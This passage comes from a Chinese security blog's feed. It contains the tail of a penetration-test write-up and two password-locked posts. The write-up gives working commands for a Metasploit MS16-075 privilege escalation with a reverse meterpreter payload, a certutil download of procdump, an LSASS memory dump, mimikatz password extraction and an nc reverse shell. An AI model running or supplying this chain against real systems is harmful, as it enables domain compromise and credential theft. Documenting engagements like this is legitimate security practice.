KB3164038(ms16-075)补丁没有打，metasploit提供了个exp</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/local/ms16_075_reflection_juicyset payload windows/meterpreter/reverse_tcpset session 2set lhost ip地址set lport  端口</code></pre><p>成功提到system权限，可以利用mimikatz读取密码了。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/16.png" alt="" loading="lazy"></p><p>由于域控上存在eset杀软，可以通过procdump+mimikatz读取密码<br>先下载procdump到域控上</p><pre class=" language-cmd"><code class="language-cmd">certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx/procdump64.exe</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/17.png" alt="" loading="lazy"></p><p>执行：</p><pre class=" language-cmd"><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/18.png" alt="" loading="lazy"></p><p>将lsass.dmp下载本地利用mimikatz读取出密码明文(两部操作都需要管理员权限)</p><pre class=" language-cmd"><code class="language-cmd"> download C:/Windows/system32/lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/19.png" alt="" loading="lazy"></p><p>下载到本地之后，mimikatz执行：</p><pre class=" language-cmd"><code class="language-cmd">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"  > 1.txt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/20.png" alt="" loading="lazy"></p><p>读取到5个用户明文，这里我只给一张图吧<br>最后登录0.11那个地址，由于cobaltstrike一直都不上线，我就采用的nc反弹</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/21.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/22.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;CobaltStrike反弹shell&quot;&gt;&lt;a href=&quot;#CobaltStrike反弹shell&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;CobaltStrike反弹shell&lt;/
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对学校的某次渗透测试</title>
    <link href="http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-07T07:44:45.000Z</published>
    <updated>2020-05-14T07:31:02.519Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a8c6a40e98316f3a60e3d398b89d99c159b967c09c63cbb9d0ce8b60466ed998">dd9f35a0f7a129882748da09be428af5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码：TloveY
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>实战渗透测试(一)</title>
    <link href="http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2020-05-14T10:13:38.659Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="62e12fd3a0c8e8c64c41e16642bf9753550bdce90032d181ee4404049cf149ef">18d47651770175ba369f96b468a937c1fae81990cd09ae7f10976f586069165c4483d03c6e498ef14fa4d5ae0ef752257dacbc6baf2e25857651cec44e1c01242d3ca13053895409d995d627b75efbb7dbbba4f9f253030de45c462a6ebe7a9f0848bf9e1f5fc90d1844c2bcb9e52227631d59d0ab035dc0b039c567fc5578c445144e57e3dafeb031bba2a0bdf359ed5ab4f5bcdf2b4591968fc43f9912170b1ded31ff33e6167ec9f150da24985fcf78570c4913c2a53f8168fcab5a0e5e8ccc8f8793813e750598f1e9a46d4d5cdb963811e83dffa9fe67788a75c9d07ef5cce617bc250a18489980fc6101efd5f9ca71b7186647399a2478a8b5b6b07bed2552e5cba4424e57c83c028d79e2964d42121f2568062bf115ff9f9eb408f40a723620afd904b726db32fe3628f29ecfdb5d9465ba7c7d06fd2680eea97b9c4c69aa569d8d2390247e7874a49a7003f771d112f22f7d35287c67c7e7a4f5577917211da06f1beded79ed93a91759eb5567a1353f825c6fdb1d61c77ff18466e16c0ea39f848dfeb45b28792ed8218840168a263d9933baad1fe8e4fab66e5f1b7b0d522c2f3681370af0b939af59e8fde7ded75737f6c9ae95469a353e4efe7840868ef3f7a80e3ba2235d0e051d5064897f75cb2938cb5e4a98eb8ad53413e46450af1d54d6be9a0a21c3abdba8ca9517459a722a68eeb3116e7d5da8648eeb36e6ff108b6e372582dd43d71bc7688111ee3e6c4af2278f2e8b13cae6951d11a7f9380517ffc1c6bffc42bb42ebb54c691cfeeb8e9613fa41e82344d9fe742f6ab914a45a4e3e3ee199ea99f0a6ea8dd9fd3f8fbd2f2479a629226199806303fac5b206e382154454f4258a52d32fb973c44b075305002b1de34a276098985c27789626ee01eb8b9b38d9e8f1e99445f0137a340eebd75d20b8d1d8ff62ca6c0da9926d071c4335f336ca8ccd875ef7abfe76748a00332847f8464f98df7eee0e13cd960ddfbfb9af5de3c0467c8d01dcccc4e6239e6bcc17a8f2d6709b7aa44d5a14f61d5ed4a09a8c447dc8163ba3096e5581e6088f8ab1bcf1b6b2116931bf021db3c6f99f57f2ce2a611608883950bf088fb9fcd8d9820f32deeabffb1f305bd80d512f7983a5cb5bb448ec5a3d2dcbdbbdcba3528092509878b7489f737e55eb6070bc97730f7a4183b656d8f848e039dfd37cc91e54bdc969b29d08dc0b114e78bb74db3113d99bf2a89733be913703c5da3151aee1ad9cc4859ac7231c9abd531fac4a80a48cf9d74e4bc9737cbe0d49f3e9da2521429beb991efcf423c79bfcc629212c52532f8aa823f3f19824ce8a8ffbb542be76b47739be28e15259bf22bb3ba5bd8af20c1e104b70e1c5230646e5e3886bd716b2dc4418ee7401271620d3ef2a2896fb8717c4e1a2358fe6d63311f27d26e25516a1e693ae8c798021162b5e24124e567b2c27d4e750e1955db6cf0f09be9bac6bc1fea6e013c3528302f0956a6528858b250adfa73206157765c79a98a21c2bc8240f37ecc6a95bda998d55d8f0bccf213ba3e5bcda5d1a7c53cab435b73c643ad05285c69207abac3dd0f0b8a332b73f43ab502958fb5e9159c60fe1b42f43feb33e2ea041520099d7ddf634d113eb9876f249dce8514e7123e959966dcac45dfaa9ee3b8694e0898ea4b374b2b5c4d64ceab0ee4391e95934549db2326ff9d5af3fed7239cfec8223c6ed9565d5b97ebfa0190415b860f81688d72ec4d6f1c7c1d73838bba9b7ba283e5c76150ec7f5dbcebee3c3b1347d2ff355b383b2eb6379fe67031a3f1ee914b15d8a704bed4a67c19e0dc92a85ea67c523ed06a012875dcbdb09a9f69d93a99c2fc5ce69e7f4428be87985f1bf68f26d7a2d0121d3d3a25cbdc04cbb32d7fd7764f677ca793138b818983e9e324d24e76323a77a7033ddad5d61bc60d598261437b0973369a5881d3e5e0df0c6ea06bac22d86f9290187e4ced889bb0b249e882a82feb67020b85956bcb1b6bc7df7a2cdd0f15be3d978d5fbac2ca5716eec2b0e9437bce735a91ec60855d619c8907420eea0d6d16ed1bcd249af0328c9101e5a97a9f118793508039ab6a5c49149e18d6b67ddb22a03b177f48e98c08f2e462c605f43f1bb939d590324667613c257aae0e2bd209a9dcd8f9addb6bb328fb283f747f546e9d6c6405fa7dba16bd73a371850dca6c1d05b91f8e4dab7f7e88048ab9823327214641e1e5fa422cd6e9c8666c9c85264ff27dafa3e1dec27f250bdd292ee245112562899761be8e6f6e63e726f91fa24d52b84e85c785dc542e953c49852d28263ea16518f1a036e7807fa79821e6a84fc7f3a1b281ffdfe623eeedc1fc4929d7d943229a8c3e9826697594d4697033a0c5f1d008a64cd45e454bdbff3f84fad9d146838c4d66429a77c3a3c103c6fb3cab3a344ca5ca21a0a9464fdd1a346550a3270e7ab5411f392c10ee6108ca39bfa1c30bf9a9789334c36c68f4bbf7d8f8137382fccd9058dd2c63bdb2a15de88cb0b5db8c43d6cb37f75dfdd08169baab35764c5b4794f5d8921adb839e1c50910790d4063785dee89658e31498fa08240a141ff5309a91bc9e678d60fd2d294b78bd7093b6a92f95ed1300cfc45ace0c9cb79e1093363ddbb9e775f4db68754b870762afdb45c8bee2842686c911470a6894296f688b6332f9716364387f339ffb18f6e36d21f81964520d03dca756383ba0d54649826fab4001adadaf8f006345badb998f0795d2819ced213348fe16081fbed19e67e1636991ad532e3a0985addfab9bb6080bd4cde4e34a84d1a70bf96b38bae24b604b1f14d51b782014e0c5f1ea7870518222cd21c1e414ea8a00c4d8d03ac62515f922cd3873806eaf9df4b89ea4364790d5a0e7635dfaf18585a6b984efb891e582a7d7359303ae839f5845407e41c83026d85e1f6d9c4f74b19b3ce66f2bc226e4f6813b5f2c4ae8be4268da8c182fcdc0bba9418e41ce62152dc6e4d7fcd693c1d32f173e8fe3ff74b2c14596140957a3c0310112ff93edbcc794ef1cb8c31f52d905c832e08401c0ea8cbe7ae14a1ff9ae13e05564149a78d4506cc8347211b967a8db182c2cfcb720c9e72e5c33ab3f7a79bcedeeeed2664143a96393e68af43588647a20cef5de24e1f20659eac249c448a8e72ccdc41d61b07b0a112ee42961f09dcc3b347ef3ea43d891a8ae4aef7b7158288c44ab295c55a655652c8a24d276723a1c4d96918e56d6286eb26fe902b7ba45304ef18bde203fa64bce0ae82aef558dece751f9a81f36b4b14b09ba3a0a5ea8ba4914a68a78097a2f08163672bc5fba07c560fff486a761a1fe6c69279f60d13029d27a2c9907a3d571ee0b9f9375c23f80d1a29eab885bb0ba07d654d49bd7924a64fe2f05c3742d25921e7ebff4c7dc10e36328e9d80ca85f13dcfd23f1470c469ec69eb014218eb70fa5c05b87959fc8601f064ba7258277b704fef3e7b453e2968ad39e4acaea426840482709e594a4974ef5492178b6454468c84997155cb0afe87a923e1bc4de18d37cffa99272ef9bd355613a52980c950a52b538db77930959db8723102d6705a4d2d157a040c81391137b9f8fbf5b11793d92294a5b0e71e49b4221aba85a429347f9c765ecc8eee69feddd4badada40530c2e0a6dbde7c08a32a76cd6ebdd6561aed3622fa00697748c9c95683de7b3953d8de52e6619304905188387933fce58b0315c304f02aa03cafb049ffe3853a75a97309ed03c1923bd67d26fb9d43ad98b2d3112c1bb90d27093b83eb3dba4997400e1486fd04831d41dbaa82edec76fe6f987e97e9482d3cc667b6d29aba7cdb6cc5c2ae23f24a2e214ede4ec499b83e815d9dc905f34132112ea9e270fb36cc13d45b87acfaf716b17d31a4049a760d4d129a6f7e28ee5b239001d61970f318202307255e99cd04f24462e9f0eb5bc067dd4575eff7f8336715771324e9aa6dedd08e5d3b8b4f2c0e16494344bca1a920bd6fc877fe81dbc3b623e1ab550bc47870201eb6a9530ac2f4f88097512193e06156dba2dbc4ed204572123c71b967ff78cfbc81f95fc62ae72722cfe5323dd7a31cb755b08bee7833844dd9e5649eef9b2b3761de68f39aa4c2c671d4a3bc35bc709dcbfce2bb496b9a6f6cd4a9b5480a802021f87471ca1f892dd4e694c653eb0d9e3f4996697668bcd02a58a2b7a2dd263b84b0b01f290d412c50fe66f901ceec1a92658f8177b83acafc15e6da5f729ff1acd3a3e9d66d0862e1751bebe8e25088b5a44c5cddae2fb4de7130a5e22ceaa181fa57fdd07e65ab40e0fb5492282b876cf4c2855a5d6bc21e878fd05efe4d78913361200e0bb1b3dfdf625b6cc0ba714a5baf8b1a81742bd9e612b9a8e522bc263bb8edfbfbe01a7a0ae63d20debddb7ccbae7ca4c7ef3cf5bf87fd0f66fc027021a27e85b542a90d3a01a784c7144fb7f27a94f4525ac36c37d7cd6c587bec942f4eb90703c7e111a55e82999b5cccdd2cd43109d1ed79a33b5fb1e818d733e15fdeeadd14eac34aca43a714f3a287caa43e335ff2d37c4cf32d777f6ad77dd5713e193c5a1a78e2708a8f36f76f19c15be0021b60a9e6007e2376a5ac662498ea9eb9bd1f57a608e8fee935e629c4622c98822f82e516826a953514b2284b956633c58b1fe5eef9bf31aca0cd43c9bbc017c69a2588955f12489411b3dd4f3a74d0a2c2342b3d1db8ae6ba728c828f492517a0ede2015b7bfc2c66f1c3a78ba2a254bfa812b465f630c520234f7bd88bc8b4975bbd0de8b4901d4698ae389392a033a2aeb849c671d11dcb6ed985656774f605ac5bdc7ab7fab66b8375c2ca489742e92f3f5b898ace145bb692b912dbf2756e687f1e38689dbd96ba8dd70e2f222579a948322a55751e6a73c92dada6329ef166631313809529f94ab9fab4c162699c9a23884fd8f081697faa894b2293cdeaafa9b73b33613fb02a85891233b8ce79eb28f1189e3c22b699ad11507a1f5efb97d129b18091191e586f5e26744a12e49cce598eb29b59de6eb88ce90505dbdb47733533e561233654421b06c04ce02dc6019dd132e5a693ed420b2bd5bcad27d2c19782d71dfa87d24a3937fbb07755e046d70ce662f00f99dd0a2a8023683366930f1627f33049b22c432596c14bbe666d3688ad4c7fcd0510de95ee073e9c71479e0df14f2c334279bacfc7b3afbeff436dea67d8db2d18b85a6096ef402613662876061f675b6a9bdf4ff472624fc0b967bff78419f6a584c0fb9e4b21276b07beaa9e431489f7e5257a2dd610d59310e5b353041cc110c99bc28ca28139d8acbe8bd2654c32b307c1e3b56421f1149850d6ef213f0f09f2f7ebaed6629e0b342c770c2b7c4350b3d45b755287211f7818cee5cc50a4e10d7f50c85dc53bfd6d3af076f1077d852d601529e578113ec2c9f53af2683bdbf79b9bbf2ecbc6575b7d48f8bd70c2ea15579894725d72be96f03946c181a4c14bd1a99a51b5aee6a08789528fd8107d150e09226cd29f059798007bbbba2bf810b368b162f2992a17999b2b9dd44931b83de60ef9f9b49b25f78fe0b8e2d286591e5361b132e3f1d64863a8a098f5052030e2e4f071c9099a4e1519f0df9accd8f3e4915ae03800764e3d9c80a637c9082fff4a4ec216a00307b7998604da77dd06e7fe3bbd8c7c5fb991b751b140a184ca0f7e1eed0b3d4a6e4c837bba591dcc91516279f49488d033e96fb5c8fa18f515cb83189014ee1c6f2b0a64198be93ccf347bd5a1e9dfec5f5ca08f189cb1d43470aab4da307bae090e5a47e899936b4a9447464b9900f1635758806f5e8353197091ef81fa7ef65a7e322a333a4e3e76ae783f5fb09414425f828dcb4da5c91dc49744c8ca28e21c523fc2d72286bffb2d9dc5ea73977c52b832a19b746d592a196f7c138ea10040f5464843a8ec8f92f97a1b9b0d0f60db101e0d0d4c83aee81b25ea12ef54c3a639f719a5dfe707f84c70432ca09168434967b08db9277787fdea88eed1fab2a30d402a1e9f3e27322b5d39520bb23866bb44ca17989645366d2763af8e298714ef2022f7fced756119505cb8f9b66897ffcdcef4aa3d4ab716f1b28be45f48b2fed1685b8d2d8a671c4054bcb13be52c5076161f95bf93da494d2fececba7258836dde6d33ff471e3a2d0b5a97985606295de52d0a397e3591fb1ace77bb2b115355ddf280900640f718c2eaedf5282a840c095c30e7086c9c67cf1437a462a3467c510a0d9aacfd14b16d0bd75062326c4726ca9f4a6ef4b019dcab2d51b45f02cea061346f79ed9d05cf1dfdd8b8536af7df472fa6d977a3d38a6871bac7d8aeaf26c8f3f9b53d80be9104054da60abd41f2f50b1323e3d13416e9a94a2be8a5e47e8d0a3d08f319190e5f85ffa0ae6853cf51c477f2c0ed8453e113e41a37f15ff8c95564276a075f47693a259adc09452ff1a7491cd418bd3d33e6364480aaaef01064138c12d40ea1045154b132fd1e689f555870c36ffe72d4292533e36e7c32cdc73aac532a91b03032c9ea9ea98d1efaa22e500d549b9f579e0004bad2d988f35d7e5b625760cc6314b0e044cd070e0ebed35731b8ca5edf590e227fcb8c390adf8a9e697af7c7d0fb8e50c9934153f212198abe7f98a87904709d24d2b937fc2068c6f4c3bf0cc550970d3e93c76913cd15274b6ffda903df044964a8c6b0434e711c4d76727225fef48d0f98d1b14e934a4d20ca7c003d526d2f69678e043e92691d39a17e9feef334901e4f1511f8ec62b2e400f3b5b83ceb3217a63508c21578fb60eab30781863aae7d4130cfaf400a495b67cbbd56d0f817bb6aa40c89bb73eea5b6fe22b977359620daa69c00d6b94c1502cc35f04348d5cfd406ec22408e0f699b68d33b43d2d76fa3ede3c197477e52766c28c4b7462b0c14ec20627bbe7053570bc32cd3750b2f3ecafbfe66f6c4a69601308a8b9d2bcc237425c5f7b65aacce49f3c3ae896fb3c6dadbd0d45ae2a1740939d5f14b4f010cfc2cb63cac62bd4352adbb6e125f3e638c170f2a6426edb574f101218d0ec447c168372ee083e858bc233bfe1875672338fab19666b3958042e39427df21c5e052f1de17415ed90c4bdbb8e5675cd7548d783ece4a1142d04dd7e7b38627a5e72779c927367e64f765c48571194a72ee4d1403b12c365905685ec38148c7f9081abda7047f98de67b99d6656a69f601ec0a89761b6bf264216315ecc6c14cecc6c07e56b39c3b297e234ccc7f22111bf5822260c3b4963405dfa5b0ca25e59591b99df119c3c23bb7bde68f78689eb2081949b973f1f2bf481ab393f1f2f08195a6dff28fea84a81d2f307e44a4cc0beb66649599e0a7f4507ff278916f2f129a5f3527d4874749bbfce9217cc2f36a8d8b1b7c75b9ff492c1ac512013484c10a9ca95d143e09c379b56ddab8e1b476e771ce1dd9cf5d3b16bd3cd134fd37afca371ca564d19a2e069f16b7c9f206c3bd3e61d4760ee3f25c40830ef00595c1a6106c3316616ed84408014c3bcf08e42c9f410c4df8c000c814699b538f204ac21ecbc18e15ffe1656e0ab5fe53299de54349a27fca37629bfe62ac83d5e4d4b9ca2599a5e70fd42a5d8e5d6d58844d495ea771f736639c3d5debdf942bcba23cc86a953c09c26b5a169e57e714cacccc54d8b05fff2f864f5c9e1464e43ad2d4fe28d5ed4697352e6038340494469e795e5ae4ada0847e0432d689f60be1f0a7c316cbbe0c45f2476d1e87ce0c04735dcebed323899b1aaef75e99442376c30b183b0bdf59ba4d7b97ef073f1f32ec4c1c5aca865cf1e76da1a809dfcdb111e945d5f908606f1f8e1d1b2c1353b0fdcef12bf376e8c831dd427ff2fa21a708f4bbb183296dfdd71b93963c29edba34fa9c525513dc5a62565ddcbc19e1605dfd5f4d4fd809db81ce95030811f295ac58fe62e13704da46b42acdc7a1a7095bd7d762913711ad942f2c21216d0c4b0712879fa4d4679cd1adf8887a75dff0999b404980fca8a1cfc1a8ea9ab434846e8c29f18a5dd59013054d68bcbc7573cb9e183b8107b6e4109d3dd879e08ee685b82719178dafdfaef687d0b0aac50da9ae5fc3c6894caa7ad0c0d9b8f8ce20720fb3579d3b8b4ad1ac6cc5585197f89e8ef27d9644ed031bda96aa98e4c218157c648bd7db1e254d4b596ec9f255e001d1f3c045aff179b00182afb652206ec61a0c27a84d79a7dcb0c7f41a45c4d6fb092afabd9c318ff40c0b44e9a59879242fa8899b52aa2a9debaed53bd5007a3fd6740a96523dca9b1042f797162a4bd4e4a27669f538ffe000fc5a8d2e28fb26346000f539fce38ffe5d3028fe91e73e0374dff8257412a0066ec3bebd5e5fb4af8709ad9b0540f64ce3ffce99ab470d1f10d0b1456848bba57c2ac2a8eb334c9e9cb51fbcc282e87bca617d8e8ef300ebaaad48065c0f3466c7a75d6f8b6577c516a31dad730aaa0747c2e91e2e2ec46cb2d3066881f17a23cb4fb7fd8a825b3ba625c8377f8c851d770529bcd1c6b206e097342dd5454bd5c7d986001d2676f954e5734ce312d30cc6520ad7c99b2db309ddca3de0d60f7db03b970194e23cf8880dec90c9cbf163995e757d3df10d1e6b3ff9e801c773fd9dce2edd5694eb184372009e492afa071e69bad3c6b3a54ccfb7be68168574e40d185c76edec9d2752afc995a24ac4be56e95db7649955dc01ba7f870f7dbcb11dc383ba5d7e6f2d1e109d22dcdf242599602e835707c7490d5e8e446d812560cc71f65139ef8aa5f50bb0a1ce3856a38ba9d8c7bb835e6d0c078f3569d94041f61ffb3b26a823383d7690616e422ad910d6d216463d5d9b6f63bb382c23398ddce485334eeee44bab85409aa8c512317ec8af4f56dbe53bdc22dabe9138f1c5e9b963e90f9da882f26dd5e129c38d438165801b84807c831a5e32fce9310bb3cd838840ad0f4e55c612b389259446e68471f7e8e089004f32e61f67e1de353483db99f36413e2da0fd3d0e42ebecc4a3a8940347c0a11d485ad6711ad87afe78593a8ef743e5595c8e78fd8ecbf20f474b4e8da455970770bfc75d2295f7ba8a9a5f85a634ad3f44095e5c4f1f2ef5652bb20d997439dd50f2361e9f30ec403061751df278b99e35d14377a07bfb2c93b5076d74e32f498a9c73dbbeb14cb1c1a07fd6589f407a2296d4c99eb96cf080946590e9bfc579608579198d44036a0b109a3207beb72cce0240a658525141de983ce5197103380e1df6f14516f5e7b84f88db03894207ac5baf491f297dcbfe76c07bd374e0eda0f812812db98e62c5bf5e36ba9eee0b7e631c3c4f3462a94147a7cf2030109c8dccf7ff102e3e4dd2917f2f39ddefb581d4548bb18739d5ef4f068d61494ca7d6ca6b18407afbefbecdf3488c38c48b5bbb389b04f8107840349d46eeb85ba5d884ec6d44a0abc954b8130cf8c0b5968869b0708e792e5f7777340d5958cea2a2d99419af244dac53972190113d5a10c10055ae74f43a137fe05174acd253da0bd40410a7d816094ce6d94ab57bebe1695563efdb38e60384d61f83b759187b699c60a92fae4af65d04a612f7bf57aeecfdcd44a1fa5dfa852273e9689d9f5a6ad492ed612b7ae13a6a96e0643eaaa3485c64e61f6852e80ae05e98837decf26ba83e02a12ce22ffbc63eb75232de1e1b2f58f08d9d2507f018afcca1044b849cbd844ffeb323553434306d1cceba0aa87dc52996f6b467e5d949dcd9ce624998b1e42a565781953769c8cf216e599248e206534799c24e56dc9b042f025dfc9e3847e00175bbbdfdca070ef3cd7376706e69635e0295b92ed74f2fb733e2422f648028a583a1fb6b75dc395b76a3fac1f1614bb64d41a50400fcc8b1a258e0bb9231cd89b425644dea96eece27e7c3986ea0954858405037d2a120a6e0eaef7e3f840f8e696bd3d5073c1c9dafaa4bfd319dcdfcf17f9b62d86099e94733b426f7ec0eab05af70560dfeb61ba5bbfb8fcc0322c637e3a8bd4588cc6c1897f5ab4058580904d56df8d55bae0a3a0d975b4629071b647e05a84eb0b6aad60efdfa90866471ee94486dbbe67e5b5aba53691b832c0ebab0f6438e984436df5927d7da505917cab9b95e5d599644b691db407a5885b4204e60b53507e0bc5e681db800600689e3f81565c6b714ab397585861e1d8cc726724ae215562f0e942b6dcebadbef7aa29ce33590dbd4dc58103fc52cc260ec28d77fd302fb0cece926f10f8d706214103cb511ce30cc1f996eb6bb4ff661f43b5ab28c0d3cea1e080faa604888c624e6e7fea73d3387058442e980e687f5a6099c585787ccdf596a65a9f2a39dd39ffac8279b3f01a4ec6c6efa872646868fc002e73491f48d27433f0a75def5e64a0cd4b1410b2320e002d137a66c21cc6a0d3802951ea0129f3036c739728c39a629a0a1b06daee5f957ebab17c0b3a1e546ffb03bdc06236eac07e6bc2239c79218700c888bcb36458e1aa45a81be1b1c7e3e3568cab73c3171f3e58901606b8ffa63cf532f5624e83a9ae78c71bd498a0935a4ef9dcd372f88597ca8901dc97f5649891dd6f2e0b9e5fc72e929062c86481c615478c664697fdc2d9ea4d87e76694f67d786e0a9017e1e2d1f3b07ccb06b9bd4688ee424e37ca54f51b5d023a7edcc1168b4af603048a76f85c657cb99a6fff181a1290292d6778417b8564e547530a1f839318e52af368dd18cde52ed4747216f5b689aa1da1bffdb1c41ea9f433b7d822d35424539fbee17b3de339ca9bc6107896908479377f2e30508619b7964a7c92a172054a7adb5375b1df16760f7473dcc7bc2fd703d165750e0bd0ab3f94da91b80df0dd6ac6f59fd18314ea7acb67adfc00dc570b5f21c91021a65e50fb78da1a9abf1822a7784ed0d1f56f18aa0ed69dafa8ba6a4b1ada7acbe615d61c7204e822e34a3ca9c2df5972218767ca973445b96bb1dd81443b7fbae37ea2c79fb51dd5deca57a15d8560fcde91723d445523b888cc698c0046260bd9e0e1528a9a45a301c6b209255286010c969a5cf592293b5f5b472bc286293b9215c5c341513bdac8b895099d42421b8e78a626c95438baf38022c63463e74e05b121365b55efd07639cce1dd464a2f30878e66c6b398973b3105c3d3a4f5672db897c67cc236850cbbfd4034c9b137465394ea73b1f9ea2de0ff52b7ae228c097571f449b041b4202ebebea78e535cce7fb2ce89f24b82ad94efec5e10754c5cee5f46df2bd253ddca8d2aa377534473555d945a27c7b0a01a2dd28c882065b369cc36297a2307b1314d782d5c96ecd124413221cb9eb510ba26f548fda048f4acf720fef34759909ed495862addeb312418b3cf1ed8c26785ebfd48056aef17807c631a7fd75966a149db13772a9b91e9a31f325ddf48d6c35ab7f5c3df8b05daa03ddb6134ced5e7c89574d54499be27f9c7b4f3d1a864a0bce599eba7787ad823c7cecc4a81be06e5df201878c7a0661568a1311b34e2b5d83d165da488111c8be0174a5728fdb9013cb9d7fd22029185b1a4b380e86d02d821ddd27e06d39c44193bd87d8031c5d726b96ba786857cf5f9d0fb48df5bcbd8e6e0aaa1434b72c7cd47a1931a161f701961b95f2078c9050e16de7269e3f1b8420b72839a62855a94913a25d6e17157b2123c6ab22b1e2e811a5a38e777e3db3e2cdb8de519fad89d62f229acc0fdd0bd77b510b820d8bafda0c9b03fbd7fb8001410ca7e2d1f41e1900bae78a51466c8ef80c6ef3f5a116c0a83671eb03dac80633a51cbb4a248cc93266741e78aa0abb346bb47ae548e1908ba9224d8b7556a6aab7f7a91db805fe4ab5803fb2cc7da11ecf69b3c0c38a91e4018152370905677e63ce74cec5f8e5e5e86ac2a80327bb34e0d52818e4b0615fd8a568ff4b004d3a5dea64b224b10202b63f9d463ef3e35d162ed9fd5b13fbbb2c909d20c59f095052ce4435b679d5c2b33a6a56c79035e2b194c32c085343f761478dbcd8af6cbf9ddca9c98d2c695e9b54eb81876fdfc89b8404a0ed663d55a2cb4a95ad66ce6ca33dd26773230632c85a9af8d80cd80512b9b075401f0fed6f7d893bf8b2bccd6c30c24415ea6b9c205a4f25417b4d0834ca4828de3a91ef93e1b6f2abe5d7fe4b21b6cbed11ee4184c8e6702747a34b109ecf89d4ea02764561db5926bbd13bee64d833cc7037eefa63e846760d50e60e04f629022d9b1de8cccf4d7a640d18a84f19e6824cf682f696177c80290ebdb5b3d2af0cf286c6c51bf73efee68dd16fd8936a3cada7e8ea9fcaa3ee7e8de5f259d7afcd450ba77379ca3e62d1175262540a1e43c66bd8389cfcb6466d7b69fda00cd7da0a75da5ad6745fd72a8bd28728bb65c8ecf49dedb09ced76e963e2b12980a7541df6c589c2f380919b74326209df61dc640e8324554891184c4c8d0f4fd2633ec57a32a5f7b790d007ad4d98b59af3e6085925f7eeac0ef5060c504af724443a46ff95119ed130f41c8a9a4f1670a11b290af6cd50267a1d3332af9364d2e5336c0a9e6b81ced7654a6aeb3d81de9bc79524400c3a22d62106e575c8c76a20b0e2d5e25ba93f4a7c4c18f58f9d6b929d58bd7a844f864e37832842778840df5bab0f2da7e7b582e36c39f31e8e28eace00d54abc4a33c98a100527f0b682871ab3bf35f17aedbe21a714437530c9f046325ff9c40455121acc07c3da229a9062df9534b3b5be78f53cbd8f445bd0765c1dc21f66b61643faaaa75527d60250dc06d85cdb51f6f596def919152d599b2fcf30c32bbc67685516344c3b99930f5f5c4f8a52aae9a7d636b241149366a5d255493a451b4322e38ef23a7efb967d7a1b318297d798db228de8a5f72ad04e1ad5b4c3382a9f004eb0ca8486bfcf766bc0424cc9182a140123d73fbfec7036e9d8efb9ccbbac1576d34f5dc3fa1961bdfb4f5e9036d3fdee70dfa0e9fd2d8989743614b81ed66376843719d645207441e52ed7b449c1d0c07fe6dfd26ea83b1404fd0b0e957fd9c86d671d7656ac463bb3da962b07115863c7b4309cc12d6d842c6b9ff1b5220da2906700470ed51c154be1cb59307b63fa444d959f4010748973af967118d8b43e2c840445e8301deafd51af4374f6ec75b4f07a83bdfd228d64b421222149a24febb42473a980f178fa782280c8cb97b48e382f5b96330eebbd2025e95a5ad5a95809c49f60e580f1fe150d32763cbf339cebe34fdf59fea68792a4239314e6debc50f9a1ba48e14f7e9d3621b0e4f27bca1cb58176bc05ed210547d316cd533a1cd1b4e6ddf6040afeaf91088c64ca5a24dd43d06d989775e0430754565f357c08089d36962405787b4393ce9b2f8b1271984676be5b80f638eeaa6f743cca87d89ec593983f47f7286fa16f6f96148f4ad231149196fbf86441d7a041ec7318dadcc6c948e2eca8c3e4f97cb792cdc91b8e844f3a0689ed365d7b9e6b23e65bcead72de60df3a5d770903842bbe5073ff15973c63aed30e0407716403b4c160e37e7f46cf20d81a95bcedc1e78